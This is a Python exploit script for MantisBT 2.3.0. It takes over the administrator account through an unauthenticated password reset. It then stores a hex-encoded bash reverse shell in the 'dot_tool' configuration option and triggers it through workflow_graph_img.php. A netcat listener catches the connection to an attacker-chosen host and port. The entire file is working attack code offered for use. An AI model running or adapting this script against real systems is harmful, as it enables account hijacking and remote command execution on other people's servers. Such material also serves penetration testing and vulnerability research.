#!/usr/bin/python3
# Exploit Title: Mantis 2.3 Unauth Password Reset + RCE
# Exploit Author: (m4ud)

import requests
from optparse import OptionParser
import binascii
import re
from urllib.parse import quote_plus
import subprocess

class Mantis():
  def __init__(self, options):
    self.target = options.target
    self.lhost = options.lhost
    self.lport = options.lport
    self.rport = options.rport
    self.headers = dict()
    self.ses = requests.Session()
    self.usr_id = "1"
    self.user = "administrator"
    self.pwd = "1234"
    self.shell = "bash -i >&/dev/tcp/%s/%s 0>&1" % (self.lhost, self.lport)
    self.v = binascii.hexlify(bytes(self.shell, encoding='utf-8')).decode("utf-8")
    self.payload = "echo " + self.v + "|xxd -p -r|bash;"


  def do_login(self):
    post = "return=index.php&username=" + self.user + "&password=" + self.pwd + "&secure_session=on"
    url = "http://" + self.target + ":" + str(self.rport) + "/mantisbt-2.3.0/login.php"
    resp = self.ses.post(url, headers=self.headers, data=post)
    self.SetConfig(self.payload)


  def hijack(self):
    print("\r\n[+] (m4ud) Mantis Password Reset n RCE [+]\r\n")
    url = "http://" + self.target + "/mantisbt-2.3.0/verify.php?id=" + self.usr_id + "&confirm_hash="
    resp = self.ses.get(url, headers=self.headers)

    if not resp.ok:
      print("[-] Failing in First Step! [-]")

    else:
      token = re.search(r"(?<=account_update_token\" value=\").*?(?=\")", resp.text).group(0)
      print("[+] Account takeover in progress! [+]")
      print("[+] Hijacking "+ self.user + "'s account [+]\r\n")
      url = "http://" + self.target + ":" + str(self.rport) + "/mantisbt-2.3.0/account_update.php"
      post = "account_update_token=" + token + "&password=" + self.pwd +"&verify_user_id=" + self.usr_id + "&realname=" + self.user + "&password_confirm=" + self.pwd
      self.headers.update({'Content-Type':'application/x-www-form-urlencoded'})
      resp = self.ses.post(url, headers=self.headers, data=post)
      self.do_login()


  def SetConfig(self, payload):
    print("[+] Inserting Payload in Database Configuration [+]")
    url = "http://" + self.target + ":" + str(self.rport) + "/mantisbt-2.3.0/adm_config_report.php"
    resp = self.ses.get(url, headers=self.headers)
    url = "http://" + self.target + ":"+ str(self.rport) + "/mantisbt-2.3.0/adm_config_set.php"

    admToken = re.search(r"(?<=adm_config_set_token\" value=\").*?(?=\")", resp.text).group(0)
    post = "adm_config_set_token=" + admToken + "&user_id=0&original_user_id=0&project_id=0&original_project_id=0&config_option=dot_tool&original_config_option=&type=0&value=" + quote_plus(payload) + "&action=create&config_set=Create+Configuration+Option"
    resp = self.ses.post(url, headers=self.headers, data=post)
    self.getShell()

  def getShell(self):
    print("\r\n[*] Do you feel lucky punk?!? [*]\r\n")
    url = 'http://' + self.target + ":" + str(self.rport) + "/mantisbt-2.3.0/workflow_graph_img.php"
    f = subprocess.Popen(["nc", "-lvnp", str(self.lport)])
    resp = self.ses.get(url, headers=self.headers)
    f.communicate()


def main():
  parser = OptionParser()
  parser.add_option("-t", "--target", dest="target", help="[ Required ] Target ip address")
  parser.add_option("-P", "--lport", dest="lport", default=str(60321), help="LPORT")
  parser.add_option("-l", "--lhost", dest="lhost", help="[ Required ] LHOST")
  parser.add_option("-p","--rport", dest="rport",default=80, help="RPORT")

  (options, args) = parser.parse_args()
  if options.target:
    exp = Mantis(options)
    exp.hijack()

if __name__=="__main__":
  main()

